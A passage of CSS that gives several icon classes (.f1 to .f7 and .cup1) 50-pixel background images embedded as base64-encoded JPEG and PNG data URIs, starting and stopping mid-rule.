            background: url("data:image/jpg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAyADIDASIAAhEBAxEB/8QAGwAAAgMBAQEAAAAAAAAAAAAAAAcEBQYIAgP/xAA0EAACAQQABAQDBQkBAAAAAAABAgMABAURBhIxQQcTIVFhcZEiMjNCUxQ2UmJygaGxstH/xAAZAQEAAwEBAAAAAAAAAAAAAAAFAwQGAQL/xAAoEQABAwQABAYDAAAAAAAAAAABAAIDBBESIQUTMVEUIjIzQnEVQWH/2gAMAwEAAhEDEQA/AOQUPKdn2q64Zx99mMilrZxsxA2xA2AO5NUibIb4dadXgXZxjFtIFBkeTbHvroKoVcvJjJHVIUUXNkAJ0vE3hG0+KEkE0gnBBIYaBGqXma4fvsHfmC8iZNb5GIOmHwPeuwsNaLOVVgq7G2PtVfxxw5YXtq9neWUc0Mqk6P8AsHsfiKJgq5G+Z+wlJqWN+mja5ESJZHIIA2NN86jPH5U7Rlt8p18x1Fafjvhu64VyTGJjPZuSI3P3h8G+PsayUs5llDggMwI6fSlmHMZNOiiXNLHWcNhSuX+eitTjuFsfc4+2uGv5QZYlc+i9wDRXjSmwPZYPlIgJ16sfSmd4Y3GWtMFJPaTXCR84UCGNDonuSVJABHYbpXzSEsqg6Ap3eCyO2AUQXawsSyupjEiuNnRIJGjXa44xXtdeuGgOlIBsbLU4viXijHYZr+cLfKmiYZh5bn1ACAhdAkn0JB3X1ynFPFN+cgy2K41rNzE8Jl82RW0CDzAcpBB9ABU29sgxtv2i+E/lSiRIUhCIG6gkkknR9QNgbontOXiu4Md21pLNCA5WMSLIB/ECQQRvQYHpRHNYfinBTm3XaVPHMmXyGImlvZJ9QjZ8yJeVjregQoII7g0rA2iexB3T78WIp7fhq5jub1ZUCHlSOERgnqNnZNIOPTSqD3bR+IpaiOTLgWCF4hHhIBe5K3uNyyw462h5Pw4UX6ACisYZJ1PLvp6dKKmw/qiyHZQkBLbOxTM8FsrClzNj55mi2Q6e5HQ6+INLhhokjv1q/wCAFQ54kjZWFnUDqehOq7VMDoTdQUTy2Vp7roGynlTNHHXJtRExDQyTOwEnuDpToj/Ne8/I1pkIbS0jsVldhzrCXby1PqS7ED+w71C4Zure58uK7kDSLoByQOdex+fvXw4+zNnibZjaalu5DyWyb2WbXU+wA9SazzBl5QNlay2IyJ/SyPjXlLaOzGOjn82eYhQvsvVjqlXaYy4uJoVhjMkjPpUUbO91a8SxSSTW91cSGW6cF5GJ6LsBQB2Fa/w9w0sWZuGmkCNFCvOSNaZxsgfIUuwinhFiiW076yp2NBVi8G5YqPtW/T3NFNDyU/Ti+jf+0VQ8S/utD+Gh7LnIdKvvDv8AeyH+iT/g0UU1Ue0VhaT3Wpij7i/M1R5D8aZvzeUfXv2oooKLqtbJ6QoljFG2VfmjRvswdV3+amVjQFM3KANsd67+lFFWKj0j6VjhPy+1f+VH+mn0oooo5aBf/9k=") 0 0;
            width: 50px;
            height: 50px;
        }

        .f6 {
            background: url("data:image/jpg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAyADIDASIAAhEBAxEB/8QAHQAAAgIDAAMAAAAAAAAAAAAAAAYFBwIECAEDCf/EADQQAAIBAwIEAwUGBwAAAAAAAAECAwAEEQUSBgchMRNBYQgUIlFSFTJxgZGxMzU3cnSy8P/EABkBAAMBAQEAAAAAAAAAAAAAAAMEBQIAAf/EACQRAAEEAQMFAAMAAAAAAAAAAAEAAgMRIQQxMwUSIjRhUaGx/9oADAMBAAIRAxEAPwBc1KSVzGfdbQ7QVKGEEle+CT1b8TWlBZy38/jyoYFVSNqEIHHQDAH7006i6+GDJCpZx8JAyR6k4wK0o4oo3IDEvKRknOf+HypXTyd01kpqRg7MBc98z769ueIp7Ka4eWK3kKqCgXoOmTjG4+ppRDyRkFXI2kEdex8jXVGi8uNC4mvddub6wuLvUHkhNksEscZG4Nnq5HxFl6VRPMPhm34P44uNFv2EgiUNNGjlvDJGdofsxHbNMOf5ltbIkmm8BI0ij+lI6bqq6vaxq0AjcoC4PTf5E+teyYtLujcAlemQD2qO4c1Ph6yghjln2zSRoHfBIQ4GQcjHf1wKZJLN3BcIFABKuMkMOn5dKzROwSRS77onyX9KKmM+n70VjsXX9V/araiSQxxH4VPbP3m+Z+Ypd4h4hstGgjjMTyTOCAAmVB9SSP0p9iK2s4nktUl2dQHGVyfI/MVEy6Q+r+Oi2VrPLNIxihVQF3Hoqj6Tnp6VM0th5N0VYkYC3Kg+Xd6rXz8U3UjWunWxCzS+GrB3AyoRWBUsuchj2qvueGh2nFN/Br1rqwTUr2Qj3GSIRiPuQGPfcf0qyOeescP6Hyl0ngvQ43h1y7MebZ0MckcpAMniBgMEGueRr1joejpYYnv78El3kUBYzjACtuJYAdsdKNEJnuMgOL2RHyQsiERGD/UpW2nSnULaCZXVZJ1iYjuDkAgeozVzeFHbxCBSFRAEAbOQMYA/HpVQw3lzqeqWMEaBdsyiJV6fEWBJJ8z6mrK1/UIrd5MToSGPUHp3qgbAsqO4CyG7Lz7qfqFFQf27D9a0V1t+odFdVPObuJsqcKMkgdh55FTnLmW2biS2gcjdskdAQOpCkgDzzStfLJFp00jMyrbwyXE0gkGNiKSdwzgYHWqX4c5maiOc3CWpXMfuumWd+I0hByWjnBjkdz5sA9StI2WUEgYrJ/KsTPawi90rc9+Yd3xZxnqsRjD2UU3hW5mXMkYRmBK/SCT1FVlcymSXeWLEgZJAHljypu516FccO80uIdNuE2Fb6R09VdiwIpThilnmSKKMyyOQqooJLEnAAA6kk9gKrQANjAbgKbqCXykne1jaXEtrOJoTtdQQD+WKzur67uG3TTs5x5mpzing/WOGIIvtuJbO6lAZbVyDKqnsXA+6fQ9aWq00tdshua5mCEb2+o0VjRXtBZtfSflPa2t3DxFFdW0M8bae8bJIgYFSDlSD5elcJ3H83sv8uH/daKKX6T6pTut5k7+2eqjnrqOFH8CPyrR9kSGGbndp/ixRyeHBM6blB2sIzgj5Giitu4VgewFs+1r/AFAf+wVSlFFD0XEEXqXOVjRRRTKnr//Z") 0 0;
            width: 50px;
            height: 50px;
        }

        .f1 {
            background: url("data:image/jpg;base64,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") 0 0;
            width: 50px;
            height: 50px;
        }

        .f7 {
            background: url("data:image/jpg;base64,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") 0 0;
            width: 50px;
            height: 50px;
        }

        .f4 {
            background: url("data:image/jpg;base64,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") 0 0;
            width: 50px;
            height: 50px;
        }

        .f3 {
            background: url("data:image/jpg;base64,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") 0 0;
            width: 50px;
            height: 50px;
        }

        .f5 {
            background: url("data:image/jpg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAyADIDASIAAhEBAxEB/8QAHAAAAgMAAwEAAAAAAAAAAAAAAAYEBQcBAgMI/8QANxAAAgEDBAEDAgEICwAAAAAAAQIDBAURAAYSITEHIkETURQIFRYjMjNScRckNUJydIGRkqHT/8QAGQEAAwEBAQAAAAAAAAAAAAAAAgQFAQMG/8QAKxEAAQQBAQYEBwAAAAAAAAAAAQACAxEEIQUSEzEyURQzQVIVImFxgZHw/9oADAMBAAIRAxEAPwC49MKioqtmzXBrXOHMkqzPEoEZbIGACQSQNInqDTG47+v0lNMZ2SrCGMgh4mVUXiTjoAjpsEaZ/SS91VLSVNNIhMEwkXgZfaGBUhhkee9LN9tzVfqtuI2+upzW1dW701MsoWcSOqqPd0qgF8n5A1Lc3ccNdEcpBjACjG4Sy0aRrTRBYysczQ8uLtnCgk5C4A+MZPY1PprlWX+50tOqNUxRymdzRKGmRMAEhT5weIOqi3NUUN4q7FPWTU4iBppqFi6wNIr8EJH9/wBz5BI8Lkam0l/s1mv9FdJaKsNVQ1YQGFIwrcFA5GMqBg46UeNMQRxtN8yUo+28lsOxWp7jWpdC81PWUuYJE5uSrZIJcEYzgY4/B05015qKOI1VXTU0iocxFwFVT4GcH7+fsNLuzq5qjbtXfbyqxVVQWqSr4jnmiA/a+l0c58sB3pE39uavuDikpp4oKQe4EJg8vBGccl6OCCca9A3NgZjaak+iVDJmvOhATXNu3en1n/UVbe49xrDwP+H3ePto1lf1an+G2/7nRqZx29kzZ7rr6a1MkcrwKJnVpJCxRCAAVQgDzkHDarNxxs3qVV1ssU1PK0lO7pKVLRgrGMkjo5AyNMe19t7gtdwWWSzVUrSq6gJ7lBC9no+B8E+eOp+5dgbivt+orhBQOsEtNEkgkBURhCQQFAPLIOpcpL2/UpsgujFDW1R7uvt0a4bingrKvMNQZYRIuWj/AKymCwKkgYOl+7xTwbghrrTZik6XNJA6ShkRlBAJDNxwfJyQpOtxj9O/xt9u1zrrZd6iK6N+viEYKxryVwB2CcFFI0gestmorJvOjloBWUdLWUQjENRBwKMvRIAOADosSIAhhP8AFYIiPmtR9xbi29t3ddLSmStkqXiLXFYJHkEjshDcmZivZOVZfIbOuE2/dq5HUWetVWpg4maYrDJz4eJCMM5zjGlAkV9fDTVRhaqmMdKkjLxKIoCjsDrCjA1tO27nt6pq4bHXG4Qz05MH4uIiMhkBALKSVYZGcjDA8e9DmRswqAJs/pdp3uyacRQCqaf0ithp4+d7p4W4DlHJcF5ocfsn2+R4OjWgLtGgdQ36a0fYz7qaPP8Ar3o0p8UPZDwh2US2T2aklExguqzd5aKsA7x3gY6/kNN9opbRdIlklN1Dvngk9wcsR9+gMDS5SRWqFJJc1ryhcFIowQD8nPkDUqaJKSCH6d0mgZgSQadg4GOlDkYU/wAutNyi+Rorq0H1V89n2sqNJ9OqJRuDBKqQkt9vPesN/KjuNvFfty026nMUlPDJI8krsWCs4AUnJJ7XWkxPRyGN5CRJCC7BpFUt3kkdZ8joEYz51hnq7LBd9/1Ah5FYaaGP3uSS+cnJAHydFgxHjgk3otl6CQKShSCNuFQGHJCDHhCp8Zz338eT41vtrt1BUWy33mSGnrKqqIThLGrKFUkEEY9wOc9jIOsTFsRbRBVsCrGIOVAxkknHXEn/AKOda7tCaWosFA1VT1BlSKJwaZVAAKjPWRnwuMHR7aiEm7RrumtmxmRjmgWV6VFx2glRIq7PjKhyB+8++jTH+dZP4Lt/xH/ro1D8DD71vgcj2LiGpqKZGNPPLDkrn6blc9H7am01ZVt+HDVU5yO8yHvsaNGq0vUUs3kFO27BDU17iphjmHf7xQ3wfvr503+B/SpdFwOP4qEY+MYTrRo0zhed+FsvlhdrwAu37eFAUGGPOPnpta16e/2Pb/8AIwaNGg2z0tVbYXU77J/0aNGoCtL/2Q==") 0 0;
            width: 50px;
            height: 50px;
        }

        .cup1 {
            background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAcCAMAAABBJv+bAAAB71BMVEVHcExleqIRFR06jNcTGymUsu1leqHWOQ7gOw9/mcuOrOSiKwunMRYAAACUsutnfaUtN0mNquKUtO2PreUvOUuBnM56IAikKwq+Mg3gOw92j71mfKQAetQ1QFVyi7eGodV7lsaVtO5yi7dNXXpxiLWEntJofqaYuPJdcZV3kL5WaYtfdJpYa45/msvpPhBKZYqWKAuMruenNBjlPQ/dOw+pLQu9bm7SOA6QrueIpdpxibR/odd7lcVIWHSGodV6lMMAZq+1eICWte9LWndme6KsRjOIpNnWOQ6Us+zDNA7dOg98lsRecpaYt/NIV3NpfqdOXnuKp91dcJRid52Yt/OqPSV+mcqKp9x8lsUSEheWtvCGoteVtO5VZ4g8SF+VtO4iKjeJptuJptw7R16Vte+Xt/JWZ4iWtvBhdpuOrOTtPxCWtfDtOwruPxCUt/WXtvLvPw+Yt/PvPAvCeX/////ybUn+9vTtPAztPg/ycE3wQBDqPg/uPg6VtO/pPA3tPw///PuUs+25iJrtQRP2oouSseruRBf2nYX++fiUtvHuSx/wYDn5u6rtOAjydVPwWDD829L6x7r//v6Qrua/foemnsXgUTOkosu2ip796uX1lnztQBH3rJjvTiOZufXzeFj1mYD1jXL85N7+8/D7z8Sv9FI/AAAAlHRSTlMAGAYDAuYx3+z01ZGSAQguFPbj+wx+GKqZ7bIlBRmW6K6ZxU2g56w0jcx8cGzU+x5q1rP46Hjx3NfuqX/GQ8bgB+NILY2ih7faObxpPeE/UWHUPTbxnPHi8xrA8ZI4RWMq8dhU0OyIGML5///////////////////////////////////////////////////////+4VJsywAAAbNJREFUKM9jYEAAMQlzdhTg7okky2uqV4AKqryQpJnEq7JAoDyruXk2mJXLgSFdkdM/Z2